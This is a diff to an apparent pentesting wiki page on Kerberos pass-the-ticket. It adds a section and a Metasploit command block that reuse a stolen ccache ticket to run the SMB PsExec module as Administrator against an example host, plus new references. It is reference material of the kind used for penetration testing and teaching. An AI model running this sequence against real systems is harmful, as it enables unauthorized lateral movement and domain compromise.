@@ -46,6 +46,30 @@ Ticket import does not grant privileges beyond those represented by the ticket a
 
 For broader Kerberos attack context and related ticket-acquisition techniques, see Tarlogic's Kerberos attack guide.<sup>[[7]](#references)</sup>
 
+### Reusing an external ticket in Metasploit
+
+Metasploit does not read Impacket's `KRB5CCNAME` automatically for its Kerberos modules. Give the module a **ccache file** through its protocol-specific `::Krb5Ccname` option. Set `::Rhostname` to the target's SPN hostname and the domain to the target domain; `RHOST` can still be the target IP. This allows an already acquired ticket to be used without entering the account password.<sup>[[8]](#references)</sup>
+
+Convert a `.kirbi` to a ccache first if necessary.<sup>[[9]](#references)</sup>
+
+For example, with a ticket for an account allowed to create services on the target, run the [SMB PsExec module](../lateral-movement/psexec-and-winexec.md) using that cache:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
+
+```text
+use exploit/windows/smb/psexec
+set RHOST 192.0.2.20
+set SMBUser Administrator
+set SMBDomain corp.example
+set SMB::Auth kerberos
+set SMB::Rhostname server.corp.example
+set SMB::Krb5Ccname /path/to/administrator.ccache
+set DomainControllerRhost 192.0.2.10
+run
+```
+
+Metasploit selects a matching service ticket from the supplied cache first. If it only finds a TGT, it requests a service ticket from the KDC, so that path also needs DC connectivity. A service-ticket-only cache does not provide access to unrelated hosts. For other supported modules, change the option prefix (for example, `Winrm::Krb5Ccname` for [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>
+
+
+
 ## References
 
 - [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
@@ -55,5 +79,7 @@ For broader Kerberos attack context and related ticket-acquisition techniques, s
 - [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
 - [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
 - [7] [Tarlogic - Kerberos attack techniques](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
+- [8] [Metasploit - Service authentication](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
+- [9] [Metasploit - Converting kirbi and ccache files](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
+- [10] [Metasploit SMB client Kerberos implementation](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
 {{#include ../../banners/hacktricks-training.md}}
